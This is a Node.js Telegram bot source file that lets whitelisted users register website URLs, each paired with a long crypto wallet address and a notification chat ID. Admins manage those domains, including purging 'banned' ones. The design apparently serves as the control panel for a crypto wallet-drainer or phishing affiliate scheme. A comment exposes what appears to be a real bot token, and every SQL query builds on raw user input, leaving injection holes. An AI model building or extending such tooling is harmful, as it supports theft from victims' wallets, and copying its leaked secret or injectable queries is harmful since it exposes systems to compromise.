const TelegramBot = require('node-telegram-bot-api');
const db = require("../lib/db")

const fs = require('fs');
const configFile = fs.readFileSync('config.json');
const config = JSON.parse(configFile);

const telegramBot = config.telegram_bot_key // 6349607314:AAGvrQCHIUkjS71sW7spha4cWiVuqqVnJHQ
const bot = new TelegramBot(telegramBot, {
    polling: true
});

const IdsGet = async () => {
    const res1 = await db.get(`SELECT * FROM adminId`)
    let adminIds = []

    res1.forEach(value => {
        adminIds.push(value.ids)
    });

    const res2 = await db.get(`SELECT * FROM userId`)
    let userIds = []

    res2.forEach(value => {
        userIds.push(value.ids)
    });

    return { adminIds, userIds }
}

const sendMsg = async (id, msg) => {
    try {
        await bot.sendMessage(id, msg, { parse_mode: 'HTML', disable_web_page_preview: true })
    } catch (e) {
        console.log(e.response.body.description);
    }
}

function isNumber(value) {
    return !isNaN(parseFloat(value)) && isFinite(value);
}

module.exports.bot = bot

module.exports.init = async () => {
    const { adminIds, userIds } = await IdsGet()

    const urlPattern = /^https:\/\/[a-zA-Z0-9-]+\.[a-zA-Z0-9-]+(?:\.[a-zA-Z]+)?$/;

    let adminTG = adminIds
    let userTG = userIds

    let combinedUser = adminTG.concat(userTG);
 
    bot.on("polling_error", err => console.log(err));
    
    bot.on('text', async msg => {
        const { text } = msg
        const userId = String(msg.from.id);
        const split = text.split(" ")

        if (split[0] === "/info" && combinedUser.includes(userId)) {
            await sendMsg(userId, 
                `
/add [url] [destination_wallet] [chat_id]

1. url - link to the website in the format https://domain.region
2. destination_wallet - recipient's address
3. chat_id - Telegram ID for receiving messages

/my_id - get your Telegram ID
/my_list - get a list of your links
/my_delete [index] - delete by index from your links

*Replace data including the brackets.
                `);
        }

        if (split[0] === "/info_admin" && adminTG.includes(userId)) {
            await sendMsg(userId, 
                `
/deleteall - delete the entire domain table
/delete [index] - delete by index or 'banned'
/list - retrieve data about domains

/add_user [tg_Id] [role] - add a user
/delete_user [tg_id] [role] - delete a user
/list_user - retrieve users' data
               `);
        }

        if(split[0] === "/my_id" && combinedUser.includes(userId)) {
            await sendMsg(userId, 
                `
Your id: ${userId}
                `
            );
        }

        if(split[0] === "/add" && combinedUser.includes(userId)) {
            const url = split[1] // https://domain.region
            const destination_wallet = split[2] // .lenght == 44
            const chat_ids = split[3] // numbers only
            const exist = 0;
            const is_banned = "0"

            if (/*urlPattern.test(url) && */destination_wallet.length > 40 && !isNaN(Number(chat_ids))) {
                const check = await db.get(`SELECT * FROM dataWallets WHERE url="${url}"`)

                if(check.length === 0) {
                    const result = await db.push(`INSERT INTO 
                    dataWallets(url, destination_wallet, chat_ids, exist, is_banned) 
                    VALUES("${url}", "${destination_wallet}", "${chat_ids}", "${exist}", ${is_banned === "1" ? 1 : 0})`
                    );

                    if(result) {
                        await sendMsg(userId, 
                        `
Successfully saved
 
URL: ${url} 
Destination: ${destination_wallet} 
TG ID: ${chat_ids}
                        `);
                    } else {
                        await sendMsg(userId, "Failed to save.");
                    }
                } else {
                    await sendMsg(userId, "Already exists.");
                }
                
            } else {
                await sendMsg(userId, "Input data error.");
            }
        }

        if(split[0] === "/change" && adminTG.includes(userId)) { //+
            const url = split[1] // https://domain.region

            if (url == 'all') {
                //Заменить все
                const allData = await db.get(`SELECT * FROM dataWallets`);
                
                for (let value of allData) {
                    const newExistValue = value.exist === 0 ? 1 : 0;
                    const result = await db.push(`UPDATE dataWallets SET exist=${newExistValue} WHERE id=${value.id}`);
                    
                    if (result) {
                        await sendMsg(userId, "Successfull: " + value.url + " exist: " + newExistValue);
                    } else {
                        await sendMsg(userId, "Error: " + value.url);
                    }
                }
            
            } else if (Number.isInteger(Number(url))) {
                const data = await db.get(`SELECT * FROM dataWallets WHERE id="${url}"`)

                for(let value of data) {

                    const result = await db.push(`UPDATE dataWallets SET exist=${value.exist === 0 ? 1 : 0} WHERE id=${value.id}`)
                    if(result) {
                        await sendMsg(userId, "Successfull: " + value.url + " exist: " + (value.exist === 0 ? 1 : 0));
                    } else {
                        await sendMsg(userId, "Error: " + value.url);
                    }
                } 
            } else {
                await sendMsg(userId, "Input data error.");
            }
        }

        if(split[0] === "/deleteall" && adminTG.includes(userId)) { //+
            const result = await db.push(`DELETE FROM dataWallets`)

            if(result) {
                await sendMsg(userId, "Successfully deleted all links.");
            } else {
                await sendMsg(userId, "Error deleting all links.");
            }
        }

        if(split[0] === "/delete" && adminTG.includes(userId)) { //+
            const index = split[1] // is number

            if (!isNaN(Number(index))) {
                const result = await db.push(`DELETE FROM dataWallets WHERE id=${index}`)
                if(result) {
                    await sendMsg(userId, "Успешно удалено.");
                } else {
                    await sendMsg(userId, "Ошибка удаления данных.");
                }
            } else if (index == 'banned') {
                const result = await db.push(`DELETE FROM dataWallets WHERE is_banned = 1`);
                if(result) {
                    await sendMsg(userId, "Забаненные домены успешно удалены.");
                } else {
                    await sendMsg(userId, "Ошибка удаления данных.");
                }
            } else {
                await sendMsg(userId, "Ошибка ввода данных.");
            }
        }

        if (split[0] === "/list" && adminTG.includes(userId)) {
        const result = await db.get(`SELECT * FROM dataWallets`);

        if (result.length) {
            for (let value of result) {
            await sendMsg(userId, 
                `
id: ${value.id}
url: ${value.url}
chat_ids: ${value.chat_ids}
destination_wallet: ${value.destination_wallet}
exist: ${value.exist}
banned: ${value.is_banned}
                    `);
                }
            } else {
                await sendMsg(userId, "No records found.");
            }
        }

        if (split[0] === "/my_list" && combinedUser.includes(userId)) {
        const result = await db.get(`SELECT * FROM dataWallets WHERE chat_ids="${userId}"`);

        if (result.length) {
            for (let value of result) {
            await sendMsg(userId, 
                `
id: ${value.id}
url: ${value.url}
chat_ids: ${value.chat_ids}
banned: ${value.is_banned}
                    `);
                }
            } else {
                await sendMsg(userId, "No records found.");
            }
        }

        if (split[0] === "/my_delete" && combinedUser.includes(userId)) {
            const index = split[1]; // is number
        
            if (!isNaN(Number(index))) {
                // Проверка наличия записи
                const checkResult = await db.get(`SELECT * FROM dataWallets WHERE id=${index} AND chat_ids=${userId}`);
                //console.log(checkResult.length)
        
                if (checkResult.length > 0) {
                    // Запись существует, выполняем удаление
                    const deleteResult = await db.push(`DELETE FROM dataWallets WHERE id=${index} AND chat_ids=${userId}`);
        
                    if (deleteResult) {
                        await sendMsg(userId, "Successfully deleted.");
                    } else {
                        await sendMsg(userId, "Error deleting data.");
                    }
                } else {
                    // Запись не существует
                    await sendMsg(userId, "Record not found.");
                }
            } else {
                await sendMsg(userId, "Input data error.");
            }
        }

        if(split[0] === "/add_user" && adminTG.includes(userId)) { //+
            const id = split[1]
            const role = split[2]

            if(role === "admin" && id && isNaN(Number(id)) === false) {
                const check = await db.get(`SELECT * FROM adminId WHERE ids="${id}"`)

                if(check.length) {
                    await sendMsg(userId, "Already exists.");
                } else {
                    await db.push(`INSERT INTO adminId(ids) values("${id}")`)

                    adminTG.push(id)
                    combinedUser = adminTG.concat(userTG)
                    await sendMsg(userId, "Successfully recorded.");
                }
            }

            else if(role === "user" && id && isNaN(Number(id)) === false) {
                const check = await db.get(`SELECT * FROM userId WHERE ids="${id}"`)

                if(check.length) {
                    await sendMsg(userId, "Already exists.");
                } else {
                    await db.push(`INSERT INTO userId(ids) values("${id}")`)

                    userTG.push(id)
                    combinedUser = adminTG.concat(userTG)
                    await sendMsg(userId, "Successfully recorded.");
                }
            } else {
                await sendMsg(userId, "Input data error.");
            }
        }

        if(split[0] === "/list_user" && adminTG.includes(userId)) { //+
            const admin = await db.get(`SELECT * FROM adminId`)
            for(let user of admin) {
                await sendMsg(userId, 
                    `
type: admin
BD ID: ${user.id},
TG ID: ${user.ids},
                    `);
            }

            const users = await db.get(`SELECT * FROM userId`)
            for(let user of users) {
                await sendMsg(userId, 
                    `
type: user
BD ID: ${user.id},
TG ID: ${Number(user.ids)},
                    `);
            }
        }

        if(split[0] === "/delete_user" && adminTG.includes(userId)) { //+
            const id = split[1]
            const role = split[2]
            
            if(role === "admin" && id && !isNaN(Number(id))) {
                const result = await db.push(`DELETE FROM adminId WHERE ids="${id}"`)

                if (result) {
                    await sendMsg(userId, "Administrator successfully deleted.");
                } else {
                    await sendMsg(userId, "Error deleting administrator.");
                }                
            }

            else if(role === "user" && id && !isNaN(Number(id))) {
                const result = await db.push(`DELETE FROM userId WHERE ids="${id}"`)

                if (result) {
                    await sendMsg(userId, "User successfully deleted.");
                } else {
                    await sendMsg(userId, "Error deleting user.");
                }                
            } else {
                await sendMsg(userId, "Input data error.");
            }

            const { adminIds, userIds } = await IdsGet()
            adminTG = adminIds 
            userTG = userIds
        
            combinedUser = adminTG.concat(userTG);
        }  
    })
}